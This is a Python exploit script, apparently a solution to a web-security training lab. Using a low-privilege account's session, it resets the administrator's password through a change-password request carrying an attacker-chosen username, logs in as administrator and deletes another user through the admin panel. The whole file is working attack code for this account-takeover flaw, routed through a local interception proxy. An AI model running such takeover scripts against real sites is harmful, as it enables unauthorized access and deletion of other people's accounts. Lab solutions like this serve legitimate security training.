import random
import string
import time
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        "csrf": get_csrf_token(s, url, path),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)
    if 'Log out' in r.text:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def change_pass(s, url, path, csrf_path, username, new_password):
    target_url = url + path
    payload = {
        'csrf': get_csrf_token(s, url, csrf_path),
        'username': username,
        'new-password-1': new_password,
        'new-password-2': new_password
    }
    r = s.post(target_url, data=payload)

    if 'Password changed successfully!' in r.text and r.status_code == 200:
        print(f'[+] Successful changing {username}\'s password to \'{new_password}\'')
    else:
        print(f'[-] Failed to change password')
        sys.exit(-1)

def delete_user(s, url, path, username):
    target_url = url + path + '?' + f'username={username}'
    r = s.get(target_url, allow_redirects=True)
    
    if 'User deleted successfully!' in r.text and r.status_code == 200:
        print(f'[+] Successful deleted {username} account')
    else:
        print(f'[-] Failed to delete {username} account')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    target_user = 'administrator'
    new_password = 'test'

    login_acc(s, url, '/login', 'wiener', 'peter')
    change_pass(s, url, '/my-account/change-password', '/my-account', target_user, new_password)
    login_acc(s, url, '/login', target_user, new_password)
    delete_user(s, url, '/admin/delete', 'carlos')
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()